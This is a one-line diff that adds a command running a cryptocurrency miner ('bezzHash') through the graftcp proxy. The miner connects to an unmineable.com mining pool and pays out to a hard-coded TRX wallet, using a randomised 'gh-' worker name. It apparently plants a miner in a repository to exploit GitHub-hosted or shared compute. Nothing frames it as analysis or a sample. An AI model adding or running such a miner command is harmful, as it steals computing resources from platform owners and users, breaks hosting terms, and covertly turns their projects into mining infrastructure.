@@ -1,0 +1,1 @@
+./graftcp/graftcp ./bezzHash --server=stratum+tcp://ethash-us.unmineable.com:13333 --user TRX:TWaMNYJS8hLkrsvjQ8DNJSMuWPjJxUq8zR.$(echo gh-$(shuf -i 1-99 -n 1))#hdij-gkd6  --list-modes --mode=99 --log --extra --latency --all-shares --shares-detail --show-mode
